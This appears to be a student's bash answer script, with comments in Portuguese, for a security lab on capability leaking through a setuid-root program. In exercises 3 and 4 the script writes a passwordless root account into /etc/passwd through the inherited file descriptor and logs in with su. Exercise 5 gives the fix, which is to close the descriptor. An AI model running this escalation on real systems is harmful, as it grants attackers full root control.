#!/bin/bash

# Exercício 1
gcc -o passwdleak passwdleak.c
sudo chown root:root passwdleak
chmod 4755 passwdleak
./passwdleak

# Exercício 2
# A nova shell herda o descritor aberto para /etc/passwd, 
# permitindo modificações indevidas a esse ficheiro onde por norma são
# guardadas as passwords (hashed) do sistema..

# Exercício 3
# Dentro da shell criada por passwdleak pode-se executar o comando
echo "ssihacker::0:0::/root:/bin/sh" >& 3
# onde 3 deve ser substituído pelo número do file descriptor apresentado
# por passwdleak

# Exercício 4
# Cria um novo utilizador sem password com privilégios de root, 
# o que permite o login através do comando  
su ssihacker
# assim dando ao atacante todo o controlo do sistema

# Exercício 5
# À semelhança do exercício 4 do capability leaking, apenas é necessário
# introduzir um "close(dfd)" antes de invocar o execl do novo terminal
